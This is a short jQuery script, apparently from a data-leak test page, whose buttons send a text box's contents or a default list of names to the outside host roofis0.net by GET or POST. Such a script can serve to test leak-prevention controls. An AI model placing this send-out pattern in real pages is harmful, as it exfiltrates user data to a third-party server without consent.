/*global $*/
var defaultData = 'scott, shane, michael, mike, paul';

function appendToPage () {
    $('#results').append('response');
}

function leakData (method, data) {
    var url = 'http://roofis0.net';

    if (!data) {
        data = defaultData;
    }

    console.log('Trying to leak to: ' + url);
    console.log('Trying to leak: ' + data);

    var req = $.ajax({
        method: method,
        url: url,
        data: data
    });

    req.done(appendToPage);

    req.fail(function( jqXHR) {
        console.log(jqXHR);
    });
}

function leakByGet () {
    leakData('GET', $('#leaky-text').val());
}

function leakByPost () {
    leakData('POST', $('#leaky-text').val());
}

function addHandlers () {
    $('#leaky-get-button').bind('click', leakByGet);
    $('#leaky-post-button').bind('click', leakByPost);
    $('#leaky-text').attr('placeholder', defaultData);
}

$(document).ready(addHandlers);
